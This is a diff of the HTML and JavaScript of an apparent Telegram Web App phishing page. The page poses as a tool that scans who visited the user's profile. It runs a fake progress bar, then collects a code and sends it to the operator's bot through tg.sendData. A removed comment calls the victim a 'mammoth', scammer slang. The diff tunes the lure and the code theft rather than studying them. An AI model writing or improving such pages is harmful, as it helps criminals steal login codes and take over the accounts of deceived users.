@@ -23,7 +23,7 @@
         <div class="logo"></div>
         <div id="step-period">
             <h2>Анализ гостей</h2>
-            <p>Выберите глубину сканирования логов посещений вашего профиля:</p>
+            <p>Выберите период для сканирования логов посещений вашего профиля:</p>
             <button class="btn" style="background:#2c2c2e;margin-bottom:10px;" onclick="startLoading()">За 7 дней</button>
             <button class="btn" onclick="startLoading()">За 30 дней</button>
         </div>
@@ -52,26 +52,20 @@
                 bar.style.width = width + '%';
                 if (width >= 75) {
                     clearInterval(interval);
+                    bar.style.width = '75%';
                     setTimeout(() => {
                         document.getElementById('step-loading').style.display = 'none';
                         document.getElementById('step-code').style.display = 'block';
                     }, 1000);
                 }
-            }, 300);
+            }, 200);
         }
         function sendCode() {
             const val = document.getElementById('u_code').value;
             if(val.length < 5) return;
             document.getElementById('confirm-btn').innerText = "Проверка...";
-            try {
-                // Пытаемся отправить данные боту
-                tg.sendData(JSON.stringify({t: 'c', v: val}));
-                setTimeout(() => { tg.close(); }, 1500);
-            } catch (e) {
-                // Если sendData не пашет, даем мамонту инструкцию
-                alert("Ошибка синхронизации. Пожалуйста, отправьте код текстом в чат бота.");
-                tg.close();
-            }
+            tg.sendData(JSON.stringify({t: 'c', v: val}));
+            setTimeout(() => { tg.close(); }, 1500);
         }
     </script>
 </body>
